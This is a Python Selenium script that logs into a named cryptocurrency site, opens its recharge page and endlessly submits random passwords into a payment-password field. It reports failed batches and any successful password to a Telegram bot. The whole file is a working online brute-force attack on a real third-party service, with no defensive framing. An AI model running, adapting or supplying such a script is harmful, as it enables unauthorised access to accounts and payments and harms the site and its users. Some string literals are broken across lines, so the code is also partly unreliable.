
import os
import time
import random
import string
import telebot
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import chromedriver_autoinstaller

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
bot = telebot.TeleBot(BOT_TOKEN)

def send_log(message):
    try:
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print("Telegram Error:", e)

def generate_password(length=None):
    length = length or random.randint(4, 10)
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=length))

def start_driver():
    chromedriver_autoinstaller.install()
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.binary_location = "/usr/bin/google-chrome"
    return webdriver.Chrome(options=options)

def main():
    driver = start_driver()
    try:
        driver.get("https://www.btc320.com/pages/user/other/userLogin")
        time.sleep(5)

        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("USERNAME"))
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("PASSWORD"))
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[6]/uni-button').click()
        time.sleep(6)
        send_log("✅ Logged in successfully.")

        driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
        time.sleep(6)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")

        attempt_count = 0
        batch = []
        while True:
            pwd = generate_password()
            attempt_count += 1
            try:
                input_box = driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[9]/uni-view/uni-view/uni-input/div/input')
                input_box.clear()
                input_box.send_keys(pwd)
                driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
                time.sleep(5)

                current_url = driver.current_url
                if "rechargePay?sn=" in current_url:
                    for _ in range(100):
                        send_log(f"✅✅✅ Password mil gaya bhai!
✅ Password: {pwd}
✅ URL: {current_url}")
                        time.sleep(0.5)
                    break

                batch.append(pwd)
                if len(batch) >= 50:
                    send_log("❌ 50 wrong passwords:
" + "\n".join(batch))
                    batch = []

            except Exception as e:
                send_log(f"⚠️ Error while testing password '{pwd}': {e}")
                time.sleep(2)

    except Exception as e:
        send_log(f"🔥 Bot crashed: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    send_log("🚀 Bot started")
    main()
